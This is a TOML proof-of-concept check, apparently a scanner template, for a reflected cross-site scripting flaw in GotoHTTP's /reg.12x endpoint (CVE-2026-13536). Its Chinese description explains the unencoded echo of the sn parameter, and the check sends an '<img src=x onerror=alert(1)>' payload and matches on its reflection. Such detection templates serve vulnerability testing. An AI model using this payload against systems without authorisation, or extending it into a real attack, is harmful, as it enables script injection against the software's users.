[info]
id = "POC-AVE-2026-0009"
name = "GotoHTTP /reg.12x 反射型XSS PoC"
author = "AVE"
severity = "medium"
tags = ["xss", "cve-2026-13536", "gotohttp", "cwe-79"]
description = "GotoHTTP /reg.12x 端点处理 sn 参数时未进行输入 sanitization，将用户提交的原始参数值未经 HTML 编码直接回显到错误响应页面，攻击者可通过构造含恶意 JavaScript 代码的 URL 诱骗用户点击，从而在受害者浏览器中执行任意脚本。"
vuln_id = ["CVE-2026-13536", "AVE-2026-0009"]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/reg.12x"

query.sn = "<img src=x onerror=alert(1)>"

[[poc.requests.matchers]]
type = "status"
status = [200]
expect = true

[[poc.requests.matchers]]
type = "word"
part = "body"
words = ["<img src=x onerror=alert(1)>"]
expect = true
